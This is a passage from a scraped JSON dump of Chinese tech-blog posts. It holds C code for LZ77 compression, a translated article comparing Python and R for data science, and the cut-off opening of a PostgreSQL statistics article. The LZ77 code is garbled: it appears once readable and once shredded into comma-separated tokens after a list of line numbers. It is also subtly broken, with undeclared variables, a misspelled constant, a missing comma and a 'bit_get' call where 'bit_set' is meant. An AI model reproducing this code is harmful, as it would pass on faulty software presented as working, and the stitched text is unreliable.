length;\r\n    }\r\n    /*指向压缩数据缓冲区*/\r\n    *compressed = comp;\r\n    /*返回压缩数据中的字节数*/\r\n    return ((opos - 1) / 8) + 1;\r\n}\r\n\r\n/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/\r\nint lz77_uncompress(const unsigned char *compressed,unsigned char **original)\r\n{\r\n    unsigned char window[LZ77_WINDOW_SIZE],\r\n                  buffer[LZ77_BUFFER_SIZE]\r\n                  *orig,\r\n                  *temp,\r\n                  next;\r\n    int           offset,\r\n                  length,\r\n                  remaining,\r\n                  hsize,\r\n                  size,\r\n                  ipos,\r\n                  opos,\r\n                  tpos,\r\n                  state,\r\n                  i;\r\n    /*使指向原始数据的指针暂时无效*/\r\n    *original = orig = NULL;\r\n\r\n    /*获取头部信息*/\r\n    hsize = sizeof(int);\r\n    memcpy(&size,compressed,sizeof(int));\r\n\r\n    /*初始化滑动窗口和前向缓冲区*/\r\n    memset(window, 0, LZ77_WINDOW_SIZE);\r\n    memset(buffer, 0, LZ77_BUFFER_SIZE);\r\n\r\n    /*解压缩数据*/\r\n    ipos = hsize * 8;\r\n    opos = 0;\r\n    remaining = size;\r\n\r\n    while(remaining > 0)\r\n    {\r\n        /*获取压缩数据中的下一位*/\r\n        state = bit_get(compressed,ipos);\r\n        ipos++;\r\n\r\n        if(state == 1)\r\n        {\r\n            /*处理的是短语标记*/\r\n            memset(&offset, 0, sizeof(int));\r\n\r\n            for(i=0; i<LZ77_WINOFF_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_WINOFF_BITS + i;\r\n                bit_set((unsigned char *)&offset, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            memset(&length, 0, sizeof(int));\r\n            for(i=0; i<LZ77_BUFLEN_BITS; i++)\r\n            {\r\n                tpos = (sizeof(int)*8) - LZ77_BUFLEN_BITS + i;\r\n                bit_set((unsigned char *)&length, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            next = 0x00;\r\n            for(i=0; i<LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_set((unsigned char *)&next, tpos, bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*确保偏移和长度对系统有正确的字节排序*/\r\n            offset = ntohl(offset);\r\n            length = ntohl(length);\r\n\r\n            /*将短语从滑动窗口写入原始数据缓冲区*/\r\n            i=0;\r\n            if(opos>0)\r\n            {\r\n                if((temp = (unsigned char *)realloc(orig,opos+length+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return 1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(length+1)) == NULL)\r\n                    return -1;\r\n            }\r\n\r\n            while(i<length && remaining>0)\r\n            {\r\n                orig[opos] = window[offset + i];\r\n                opos++;\r\n                /*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/\r\n                buffer[i] = window[offset + i];\r\n                i++;\r\n\r\n                /*调整剩余符号总数*/\r\n                remaining --;\r\n            }\r\n\r\n            /*将不匹配的符号写入原始数据缓冲区*/\r\n            if(remaining > 0)\r\n            {\r\n                orig[opos] = next;\r\n                opos++;\r\n\r\n                /*仍需在前向缓冲区中记录此符号*/\r\n                buffer[i] = next;\r\n\r\n                /*调整剩余字符总数*/\r\n                remaining--;\r\n            }\r\n            /*调整短语长度*/\r\n            length++;\r\n        }\r\n        else\r\n        {\r\n            /*处理的是字符标记*/\r\n            next = 0x00;\r\n            for(i=0; i<LZ77_NEXT_BITS; i++)\r\n            {\r\n                tpos = (sizeof(unsigned char)*8) - LZ77_NEXT_BITS + i;\r\n                bit_get((unsigned char *)&next, tpos,bit_get(compressed,ipos));\r\n                ipos++;\r\n            }\r\n\r\n            /*将字符写入原始数据缓冲区*/\r\n            if(opos > 0)\r\n            {\r\n                if((temp = (unsigned char*)realloc(orig,opos+1)) == NULL)\r\n                {\r\n                    free(orig);\r\n                    return -1;\r\n                }\r\n                orig = temp;\r\n            }\r\n            else\r\n            {\r\n                if((orig = (unsigned char *)malloc(1)) == NULL)\r\n                return -1;\r\n            }\r\n            orig[opos] = next;\r\n            opos++;\r\n\r\n            /*在前向缓冲区中记录当前字符*/\r\n            if(remaining > 0)\r\n                buffer[0] = next;\r\n            /*调整剩余数量*/\r\n            remaining--;\r\n\r\n            /*设置短语长度为1*/\r\n            length = 1;\r\n        }\r\n        /*复制前向缓冲中的数据到滑动窗口*/\r\n        memmove(&window[0], &window[length],LZ7_WINDOW_BITS - length);\r\n        memmove(&window[LZ77_WINDOW_SIZE - length], &buffer[0], length);\r\n    }\r\n    /*指向原始数据缓冲区*/\r\n    *original = orig;\r\n\r\n    /*返回解压缩的原始数据中的字节数*/\r\n    return  opos;\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300,301,302,303,304,305,306,307,308,309,310,311,312,313,314,315,316,317,318,319,320,321,322,323,324,325,326,327,328,329,330,331,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,/*lz77.c*/,#include <netinet/in.h>,#include <stdlib.h>,#include <string.h>, ,#include \"bit.h\",#include \"compress.h\", ,/*compare_win 确定前向缓冲区中与滑动窗口中匹配的最长短语*/,static, ,int, ,compare_win,(,const, ,unsigned, ,char, ,*,window,,, ,const, ,unsigned, ,char, ,*,buffer,,,                       ,int, ,*,offset,,, ,unsigned, ,char, ,*,next,),{,    ,int, ,match,,,longest,,,i,,,j,,,k,;, ,    ,/*初始化偏移量*/,    ,*,offset, ,=, ,0,;, ,    ,/*如果没有找到匹配，准备在前向缓冲区中返回0和下一个字符*/,    ,longest, ,=, ,0,;,    ,*,next, ,=, ,buffer,[,0,],;, ,    ,/*在前向缓冲区和滑动窗口中寻找最佳匹配*/,    ,for,(,k,=,0,;, ,k,<,LZ77_WINDOW_SIZE,;, ,k,++,),    ,{,        ,i, ,=, ,k,;,        ,j, ,=, ,0,;,        ,match, ,=, ,0,;, ,        ,/*确定滑动窗口中k个偏移量匹配的符号数*/,        ,while,(,i,<,LZ77_WINDOW_SIZE, ,&&, ,j,<,LZ77_BUFFER_SIZE, ,-, ,1,),        ,{,            ,if,(,window,[,i,], ,!=, ,buffer,[,j,],),                ,break,;, ,            ,match,++,;,            ,i,++,;,            ,j,++,;,        ,}, ,        ,/*跟踪最佳匹配的偏移、长度和下一个符号*/,        ,if,(,match, ,>, ,longest,),        ,{,            ,*,offset, ,=, ,k,;,            ,longest, ,=, ,match,;,            ,*,next, ,=, ,buffer,[,j,],;,        ,},    ,},    ,return, ,longest,;,}, ,/*lz77_compress  使用lz77算法压缩数据*/,int, ,lz77_compress,(,const, ,unsigned, ,char, ,*,original,,,unsigned, ,char, ,*,*,compressed,,,int, ,size,),{,    ,unsigned, ,char,     ,window,[,LZ77_WINDOW_SIZE,],,,                      ,buffer,[,LZ77_BUFFER_SIZE,],,,                      ,*,comp,,,                      ,*,temp,,,                      ,next,;,    ,int,               ,offset,,,                      ,length,,,                      ,remaining,,,                      ,hsize,,,                      ,ipos,,,                      ,opos,,,                      ,tpos,,,                      ,i,;,    ,/*使指向压缩数据的指针暂时无效*/,    ,*,compressed, ,=, ,NULL,;, ,    ,/*写入头部信息*/,    ,hsize, ,=, ,sizeof,(,int,),;,    ,if,(,(,comp, ,=, ,(,unsigned, ,char, ,*,),malloc,(,hsize,),), ,==, ,NULL,),        ,return, ,-,1,;,    ,memcpy,(,comp,,,&,size,,,sizeof,(,int,),),;, ,    ,/*初始化滑动窗口和前向缓冲区(用0填充)*/,    ,memset,(,window,,, ,0, ,,, ,LZ77_WINDOW_SIZE,),;,    ,memset,(,buffer,,, ,0, ,,, ,LZ77_BUFFER_SIZE,),;, ,    ,/*加载前向缓冲区*/,    ,ipos, ,=, ,0,;, ,    ,for,(,i,=,0,;, ,i,<,LZ77_BUFFER_SIZE, ,&&, ,ipos, ,<, ,size,;, ,i,++,),    ,{,        ,buffer,[,i,], ,=, ,original,[,ipos,],;,        ,ipos,++,;,    ,}, ,    ,/*压缩数据*/,    ,opos, ,=, ,hsize *, ,8,;,    ,remaining, ,=, ,size,;, ,    ,while,(,remaining, ,>, ,0,),    ,{,        ,if,(,(,length, ,=, ,compare_win,(,window,,,buffer,,,&,offset,,,&,next,),), ,!=, ,0,),        ,{,            ,/*编码短语标记*/,            ,token, ,=, ,0x00000001, ,<<, ,(,LZ77_PHRASE_BITS, ,-, ,1,),;, ,            ,/*设置在滑动窗口找到匹配的偏移量*/,            ,token, ,=, ,token, ,|, ,(,offset, ,<<, ,(,LZ77_PHRASE_BITS, ,-, ,LZ77_TYPE_BITS, ,-, ,LZ77_WINOFF_BITS,),),;, ,            ,/*设置匹配串的长度*/,            ,token, ,=, ,token, ,|, ,(,length, ,<<, ,(,LZ77_PHRASE_BITS, ,-, ,LZ77_TYPE_BITS, ,-, ,LZ77_WINOFF_BITS, ,-, ,LZ77_BUFLEN_BITS,),),;, ,            ,/*设置前向缓冲区中匹配串后面紧邻的字符*/,            ,token, ,=, ,token, ,|, ,next,;, ,            ,/*设置标记的位数*/,            ,tbits, ,=, ,LZ77_PHRASE_BITS,;,        ,},        ,else,        ,{,            ,/*编码一个字符标记*/,            ,token, ,=, ,0x00000000,;, ,            ,/*设置未匹配的字符*/,            ,token, ,=, ,token, ,|, ,next,;, ,            ,/*设置标记的位数*/,            ,tbits, ,=, ,LZ77_SYMBOL_BITS,;,        ,}, ,        ,/*确定标记是大端格式*/,        ,token, ,=, ,htonl,(,token,),;, ,        ,/*将标记写入压缩缓冲区*/,        ,for,(,i,=,0,;, ,i,<,tbits,;, ,i,++,),        ,{,            ,if,(,opos, ,%, ,8, ,==, ,0,),            ,{,                ,/*为压缩缓冲区分配临时空间*/,                ,if,(,(,temp, ,=, ,(,unsigned, ,char, ,*,),realloc,(,comp,,,(,opos, ,/, ,8,), ,+, ,1,),), ,==, ,NULL,),                ,{,                    ,free,(,comp,),;,                    ,return, ,-,1,;,                ,},                ,comp, ,=, ,temp,;,            ,}, ,            ,tpos, ,=, ,(,sizeof,(,unsigned, ,long, ,), ,*, ,8,), ,-, ,tbits, ,+, ,i,;,            ,bit_set,(,comp,,,opos,,,bit_get,(,(,unsigned, ,char, ,*,),&,token,,,tpos,),),;,            ,opos,++,;,        ,},        ,/*调整短语长度*/,        ,length,++,;, ,        ,/*从前向缓冲区中拷贝数据到滑动窗口中*/,        ,memmove,(,&,window,[,0,],,,&,window,[,length,],,,LZ77_WINDOW_SIZE, ,-, ,length,),;,        ,memmove,(,&,window,[,LZ77_WINDOW_SIZE, ,-, ,length,],,,&,buffer,[,0,],,,length,),;,        ,memmove,(,&,buffer,[,0,],,,&,buffer,[,length,],,,LZ77_BUFFER_SIZE, ,-, ,length,),;,        ,/*向前向缓冲区中读取更多数据*/,        ,for,(,i, ,=, ,LZ77_BUFFER_SIZE, ,-, ,length,;, ,i,<,LZ77_BUFFER_SIZE, ,&&, ,ipos, ,<,size,;, ,i,++,),        ,{,            ,buffer,[,i,], ,=, ,original,[,ipos,],;,            ,ipos,++,;,        ,}, ,        ,/*调整剩余未匹配的长度*/,        ,remaining, ,=, ,remaining, ,-, ,length,;,    ,},    ,/*指向压缩数据缓冲区*/,    ,*,compressed, ,=, ,comp,;,    ,/*返回压缩数据中的字节数*/,    ,return, ,(,(,opos, ,-, ,1,), ,/, ,8,), ,+, ,1,;,}, ,/*lz77_uncompress  解压缩由lz77_compress压缩的数据*/,int, ,lz77_uncompress,(,const, ,unsigned, ,char, ,*,compressed,,,unsigned, ,char, ,*,*,original,),{,    ,unsigned, ,char, ,window,[,LZ77_WINDOW_SIZE,],,,                  ,buffer,[,LZ77_BUFFER_SIZE,],                  ,*,orig,,,                  ,*,temp,,,                  ,next,;,    ,int,           ,offset,,,                  ,length,,,                  ,remaining,,,                  ,hsize,,,                  ,size,,,                  ,ipos,,,                  ,opos,,,                  ,tpos,,,                  ,state,,,                  ,i,;,    ,/*使指向原始数据的指针暂时无效*/,    ,*,original, ,=, ,orig, ,=, ,NULL,;, ,    ,/*获取头部信息*/,    ,hsize, ,=, ,sizeof,(,int,),;,    ,memcpy,(,&,size,,,compressed,,,sizeof,(,int,),),;, ,    ,/*初始化滑动窗口和前向缓冲区*/,    ,memset,(,window,,, ,0,,, ,LZ77_WINDOW_SIZE,),;,    ,memset,(,buffer,,, ,0,,, ,LZ77_BUFFER_SIZE,),;, ,    ,/*解压缩数据*/,    ,ipos, ,=, ,hsize *, ,8,;,    ,opos, ,=, ,0,;,    ,remaining, ,=, ,size,;, ,    ,while,(,remaining, ,>, ,0,),    ,{,        ,/*获取压缩数据中的下一位*/,        ,state, ,=, ,bit_get,(,compressed,,,ipos,),;,        ,ipos,++,;, ,        ,if,(,state, ,==, ,1,),        ,{,            ,/*处理的是短语标记*/,            ,memset,(,&,offset,,, ,0,,, ,sizeof,(,int,),),;, ,            ,for,(,i,=,0,;, ,i,<,LZ77_WINOFF_BITS,;, ,i,++,),            ,{,                ,tpos, ,=, ,(,sizeof,(,int,),*,8,), ,-, ,LZ77_WINOFF_BITS, ,+, ,i,;,                ,bit_set,(,(,unsigned, ,char, ,*,),&,offset,,, ,tpos,,, ,bit_get,(,compressed,,,ipos,),),;,                ,ipos,++,;,            ,}, ,            ,memset,(,&,length,,, ,0,,, ,sizeof,(,int,),),;,            ,for,(,i,=,0,;, ,i,<,LZ77_BUFLEN_BITS,;, ,i,++,),            ,{,                ,tpos, ,=, ,(,sizeof,(,int,),*,8,), ,-, ,LZ77_BUFLEN_BITS, ,+, ,i,;,                ,bit_set,(,(,unsigned, ,char, ,*,),&,length,,, ,tpos,,, ,bit_get,(,compressed,,,ipos,),),;,                ,ipos,++,;,            ,}, ,            ,next, ,=, ,0x00,;,            ,for,(,i,=,0,;, ,i,<,LZ77_NEXT_BITS,;, ,i,++,),            ,{,                ,tpos, ,=, ,(,sizeof,(,unsigned, ,char,),*,8,), ,-, ,LZ77_NEXT_BITS, ,+, ,i,;,                ,bit_set,(,(,unsigned, ,char, ,*,),&,next,,, ,tpos,,, ,bit_get,(,compressed,,,ipos,),),;,                ,ipos,++,;,            ,}, ,            ,/*确保偏移和长度对系统有正确的字节排序*/,            ,offset, ,=, ,ntohl,(,offset,),;,            ,length, ,=, ,ntohl,(,length,),;, ,            ,/*将短语从滑动窗口写入原始数据缓冲区*/,            ,i,=,0,;,            ,if,(,opos,>,0,),            ,{,                ,if,(,(,temp, ,=, ,(,unsigned, ,char, ,*,),realloc,(,orig,,,opos,+,length,+,1,),), ,==, ,NULL,),                ,{,                    ,free,(,orig,),;,                    ,return, ,1,;,                ,},                ,orig, ,=, ,temp,;,            ,},            ,else,            ,{,                ,if,(,(,orig, ,=, ,(,unsigned, ,char, ,*,),malloc,(,length,+,1,),), ,==, ,NULL,),                    ,return, ,-,1,;,            ,}, ,            ,while,(,i,<,length, ,&&, ,remaining,>,0,),            ,{,                ,orig,[,opos,], ,=, ,window,[,offset, ,+, ,i,],;,                ,opos,++,;,                ,/*在前向缓冲区中记录每个符号，直到准备更新滑动窗口*/,                ,buffer,[,i,], ,=, ,window,[,offset, ,+, ,i,],;,                ,i,++,;, ,                ,/*调整剩余符号总数*/,                ,remaining, ,--,;,            ,}, ,            ,/*将不匹配的符号写入原始数据缓冲区*/,            ,if,(,remaining, ,>, ,0,),            ,{,                ,orig,[,opos,], ,=, ,next,;,                ,opos,++,;, ,                ,/*仍需在前向缓冲区中记录此符号*/,                ,buffer,[,i,], ,=, ,next,;, ,                ,/*调整剩余字符总数*/,                ,remaining,--,;,            ,},            ,/*调整短语长度*/,            ,length,++,;,        ,},        ,else,        ,{,            ,/*处理的是字符标记*/,            ,next, ,=, ,0x00,;,            ,for,(,i,=,0,;, ,i,<,LZ77_NEXT_BITS,;, ,i,++,),            ,{,                ,tpos, ,=, ,(,sizeof,(,unsigned, ,char,),*,8,), ,-, ,LZ77_NEXT_BITS, ,+, ,i,;,                ,bit_get,(,(,unsigned, ,char, ,*,),&,next,,, ,tpos,,,bit_get,(,compressed,,,ipos,),),;,                ,ipos,++,;,            ,}, ,            ,/*将字符写入原始数据缓冲区*/,            ,if,(,opos, ,>, ,0,),            ,{,                ,if,(,(,temp, ,=, ,(,unsigned, ,char,*,),realloc,(,orig,,,opos,+,1,),), ,==, ,NULL,),                ,{,                    ,free,(,orig,),;,                    ,return, ,-,1,;,                ,},                ,orig, ,=, ,temp,;,            ,},            ,else,            ,{,                ,if,(,(,orig, ,=, ,(,unsigned, ,char, ,*,),malloc,(,1,),), ,==, ,NULL,),                ,return, ,-,1,;,            ,},            ,orig,[,opos,], ,=, ,next,;,            ,opos,++,;, ,            ,/*在前向缓冲区中记录当前字符*/,            ,if,(,remaining, ,>, ,0,),                ,buffer,[,0,], ,=, ,next,;,            ,/*调整剩余数量*/,            ,remaining,--,;, ,            ,/*设置短语长度为1*/,            ,length, ,=, ,1,;,        ,},        ,/*复制前向缓冲中的数据到滑动窗口*/,        ,memmove,(,&,window,[,0,],,, ,&,window,[,length,],,,LZ7_WINDOW_BITS, ,-, ,length,),;,        ,memmove,(,&,window,[,LZ77_WINDOW_SIZE, ,-, ,length,],,, ,&,buffer,[,0,],,, ,length,),;,    ,},    ,/*指向原始数据缓冲区*/,    ,*,original, ,=, ,orig,;, ,    ,/*返回解压缩的原始数据中的字节数*/,    ,return,  ,opos,;,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 2 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114214/", "url_object_id": "569d347b7faf6939bbf51a1b0f5d5c37", "front_image_path": "full/8c38398f296a7779190d5d6669e90e1476ae113d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/dd000831704fa240c532ce5ef32a7094.png"], "title": "数据科学领域，你该选 Python 还是 R ？", "create_time": "2018/07/24", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,usejournal,   译文出处：,开源中国,   ,\n,根据需求，为了那些希望知道在数据科学方面选择 Python 还是 R 编程语言的人，我发布了这篇指导文章。你可能在数据科学方面是个新手，或者你需要在一个项目中选出一个语言，这篇文章可能会帮助到你。,\n,非免责声明：在最大的数据科学家雇主之一（Deloitte）中，我是一个数据科学家的管理者。我也对 R 和 Python 有几十年的了解。我是个语言不可知论者，但是参与到 Python 社区已经有15年左右了。,\n,还会有第三种选择,\n,\n,Hadley Wickham,, RStudio 的首席数据科学家，已经给出了答复“使用‘and’替代‘vs’”。由此，同时使用Python/R 是我将提到的第三种选择。这个选项引起了我的好奇心，而且我会在本文末尾介绍这一点。,\n,如何比较 R 和 Python,\n,下面是这两种语言之间一些值得比较的因素，这并不是一个完全的列表。,\n,\n,历史,：R 和 Python 具有明显不同的历史，有时候会交叉。,\n,社区,：通过实际调查发现的很多复杂的社会人类学因素。,\n,性能,：详尽的比较以及为什么比较起来这么难。,\n,第三方支持,：模块，代码库，可视化，存储库，组织和开发环境。,\n,用例,：有些任务和工作类型适合其中一种或者另一种。,\n,我们不能和睦相处吗？,Python 调用 R 和 R 调用 Python 。,\n,预测 R 还是 Python,：吃你自家的狗粮的一个预测练习。,\n,偏好,：最终答案。,\n,\n,历史,\n,\n,简短概要：,\n,\n,ABC -> Python 发布（1989 Guido van Rossum）-> Python 2 (2000) -> Python 3 (2008),\n,Fortan -> S(贝尔实验室)-> R 发布（1991 Ross Ihaka 和 Robert Gentleman）-> R 1.0.0 (2000) ->R  3.0.2 (2013),\n,\n,社区,\n,当比较Python和R的用户时，首先要记住的就是：,\n,\n,只有50%的Python用户与R重叠,\n,那是假定所有R程序员会用“科学和数字（Scientific and Numeric）”来称呼他。我们也确定，无论程序员的等级如何，这个分布都是正确的。,\n,要进一步了解Python“宣传”，请阅读关于Python宣传调查结果：,https://www.linkedin.com/pulse/python-hype-survey-results-experience-any-drastic-decline-brian-ray/,\n,如果我们只看科学和数字社区，这就会把我们带到第二类社区，哪个社区？在所有的科学和数字社区中有一些子社区。尽管也许还会有一些重叠，因为你会怀疑他们与大一些的R/Python社区之间的交互方式确实不同。,\n,一些使用Python/R的子社区的例子：,\n,\n,深度学习,\n,机器学习,\n,高级分析,\n,预测分析,\n,统计,\n,探索和数据分析,\n,学术可惜研究,\n,几乎无穷无尽的,计算领域研究,\n,\n,然而每个领域看起来都只致力于一个专门社区，你会发现R在如统计和探索之类的领域中更加流行。不久前，你可能会使用R进行构建运行或者做一些非常有意义的探索，而使用的时间比安装Python或者用它来做相同的探索的时候短得多。,\n,这一切都被颠覆性的技术改变了，他们是Jupyter notebook和Anaconda。,\n,注：Jupyter Notebokks：在浏览器中可以编辑Python/R代码；Anaconda：可以为Python和R简单的安装和打包,\n,既然你可以在一个方便提供报告和现成的分析的环境启动运行，就已经排除了一个横在那些想要完成这些任务的人和他们喜爱的语言之间的障碍。Python现在可以使用独立于平台的方式打包，而且可以更快的提供快速、低成本的分析比。,\n,在社区中影响了语言选择的另一个区别就是“开源”思想。不仅是开源库，还有致力于开源的协作社区的影响。讽刺的是，开源许可软件，像Tensorflow这样的软件到GNU Scientific Library（各自为Apache和GPL），他们看起来都有Python和R绑定。尽管有R的公共版权，还是有更多人纯粹的支持Python社区。另一方面，看起来有更多的企业支持R，特别是那些有统计方面历史的。,\n,最后，考虑到社区和协作，在Github上Python的支持更多。如果我要看,最新Python包趋势,，我会看到有超过3.5万个关注的Tensorflow之类的项目。相反，如果我看,R包的最新趋势,，像Shiny，Stan…之类的包，他们都少于2千个关注。,\n,性能,\n,性能提升很困难，因为有太多的指标和情况需要测试了，也很难基于特定的硬件来测试。一些操作在某个语言里已经做了优化，但其它语言里却还没有实现。确实，你可能会失去一些东西，比如：一些人会抱怨，一些人会离开，整个分析报告也可能会被丢弃。无论如何，生活还是要继续… …,\n,循环,\n,在继续之前，让我们先看一下 Python 和 R 是怎么样使用的。在 R 中，你是如何做循环迭代的呢？R 语言有稍微的不同。,\n,\n,\n,通过一个快速的完整性检查, 包括加载时间和命令行运行时间: R 耗时 0m0.238s, Python 耗时是0m0.147s. 再次，这不是一个严谨的测试。,\n,一个快速的测试显示 Python 代码会快很多，通常，这并不是太重要。,\n,既然速度不是重点，那数据科学家更关心哪些东西呢？从这两门语言最新的趋势发现，它们被用作命令式语言的能力是一个重要的因素。比如，大多数 Python 程序员严重依赖 Pandas 来工作。这又引出了下一个主题：两种语言都有哪些模块和库，它们又是如何实现的？这是一个更有意义的比较。,\n,第三方支持,\n,包管理工具,\n,Python 使用 PyPi ，R 使用 CRAN ，Anaconda 同时支持二者。,\n,CRAN 使用它内部的“install.packages”命令做分发管理。截至目前为止，CRAN 上有大约 12000 个有效的软件包。浏览一下你就会发现，大约二分之一的包是关于数据科学的，占了大约 6000 个还不止。,\n,PyPi 上有超过 CRAN 十倍数量的包，大约 141000 个左右。其中有大约 3700 个包被标识为科学工程相关的。当然还有大量的包实际是科学相关的，但并没有被正确标识出来。,\n,这两种语言好像并没有受到大量的重复劳动的影响。确实，当我在 PyPi 上搜索“随机森林”时，我搜到了 170 个项目，可是，这些包之间又有些许的不同。,\n,尽管 Python 包的数量超过 R 十倍之多，但做数据科学计算的包的数量却差不多，也许 Python 更少一些。,\n,大量有效的第三方库是非常重要的，所有东西都要从头写是非常痛苦的。同样地，我也希望你做一些工作来回馈社区。,\n,速度很重要,\n,DataFrames vs Pandas可能是一个更有意义和更重要的比较。,\n,我们进行一个实验：在进行复制的时候进行一个复杂的遍历，比较两者的执行时间。下面是结果：,\n,\n,源代码： ,http://nbviewer.jupyter.org/gist/brianray/4ce15234e6ac2975b335c8d90a4b6882,\n,正如我们看到的结果，Python+Pandas要比原生的R DataFrames快很多。请注意这并不意味着Python要比R快。Pandas是基于C语言写的Numpy库的。,\n,想象一下这个！,\n,\n,我真正想说的是ggplot2 vs matplotlib。声明：matplotlib是Python社区里我最看重的一个人写的，他教会了我Python，他就是 John D. Hunter。,\n,Matplotlib是一个强大而且可个性化定制的库，虽然不太容易学但是扩展性非常好。ggplot不但不易个性化定制而且可以说更加困难。,\n,如果你喜欢漂亮的绘图图案，而且并不需要自定义绘图，R是我的选择。如果你需要做更多的事情选择Matplotlib，他甚至可以帮助与bokeh进行交互。同样，你可能在寻找的ShinnyR对R而言也会增加其交互性。,\n,难道我们不能同时使用两种语言吗？,\n,有些人可能要问：你为什么不能同时使用两种语言呢？,\n,有一些情况你可以同时使用这两个。比如当：,\n,\n,你的项目组或组织允许的时候。,\n,你能比较容易地同时维护这两种环境。,\n,你的代码不需要迁移到另一个系统。,\n,你不会给别人制造一些混乱。,\n,\n,一些可以使两者同时工作的方法：,\n,\n,Python 对 R 的包装器，比如：rpy2，pyRserve，Rpython，… (rpy2 扩展在 Jupyter 中有使用),\n,R 也有一些包，比如：rPython，PythonInR，,reticulate,，rJython，SnakeCharmR，XRPython,\n,在 Jupyter 里，混合这两种语言，举例如下：,\n,\n,\n,然后，我们可以传递 pandas 数据帧，它会通过 rpy2 被自动转换为 R 数据帧，传递时加上 “-i df”开关。,\n,\n,代码源: ,http://nbviewer.jupyter.org/gist/brianray/734bd54f468d9a6db9171b2cfc98405a,\n,R 与 Python 预测,\n,Kaggle 上的一个用户,写了一个关于,预测开发人员使用 R 还是 Python, 的内核。他根据这些数据得出了一些有趣的观察结果:,\n,\n,\n,如果你希望明年转向 Linux ，你更有可能是一个 Python 用户。,\n,如果你研究统计学，你更有可能是 R 用户。如果你研究计算机科学，你可能是 Python 用户。,\n,如果你年轻（18-24岁），你更可能是 Python 用户。,\n,如果你进行代码竞赛，你更可能是 Python 用户。,\n,如果你明年想使用安卓，你更可能是 Python 用户。,\n,如果你明年想学习 SQL ，你更可能是 R 用户。,\n,如果你使用 MS office ，你更可能是 R 用户。,\n,如果你明年想使用 Rasperry Pi ，你更可能是一个 Python 用户。,\n,如果你是全日制学生，你更可能是 Python 用户。,\n,如果你使用敏捷方法，你更可能是 Python 用户。,\n,如果你对 AI 的看法是担忧而不是兴奋，你更可能是 R 用户。,\n,\n,偏好,\n,当我与Alex Martelli, Googler 和 Stack Overflow的统治者通信时，他向我解释为什么Google开始使用他们官方支持的一些语言。即使在像Google这样的自由精神创新空间，似乎有一些制度。这是在这里能起作用的偏好，公司偏好。,\n,除了企业偏好，有些人在组织里经常创造第一。我知道在Deloitte第一个使用R语言的是谁。他仍然在公司，他是数据学家的领军人。重点是，在所有事情上我通常会建议，遵循你的爱。爱你所追随的，引领潮流，爱你所做的。,\n,一个合格的声明，虽然我从未成为工具的第一思考着，但如果你正在做一写重要的事情，那可能不是做实验的最佳时机。错误是可能的。然而，每个精心的设计数据科学项目都给数据学家留下了一定的空间。使用其中的一部分来学习和实验。保持开源心态，拥抱多样性。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114228/", "url_object_id": "b6c210eac000139f79578c3d3bee89d1", "front_image_path": "full/be000b8e51b341ae219135db8c48438ce60885cf.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2013/03/PostgreSQL-logo.gif"], "title": "10 个你不知道的 PostgreSQL 功能：创建统计信息", "create_time": "2018/07/26", "vote": "1", "bookmark": "1", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Samay Sharma,   译文出处：,开源中国,   ,如果你曾使用 Postgres 做过一些性能优化，你或许已经使用过 EXPLAIN 。EXPLAIN 向你展示了 PostgreSQL planner 为提供的语句生成的执行计划。它说明了语句涉及到的表将会使用顺序扫描、索引扫描等方式进行扫描，在使用多表的情况下将会使用连接算法。但是， Postgres 是如何产生这些规划的？,\n,决定使用哪种规划的一个非常重要的输入是 planner 收集到的,数据统计,。这些统计的数据能够使 planner 评估执行规划的某一部分会返回多少行，继而影响到使用哪一种规划或连接算法。它们主要是通过运行 ANALYZE 或 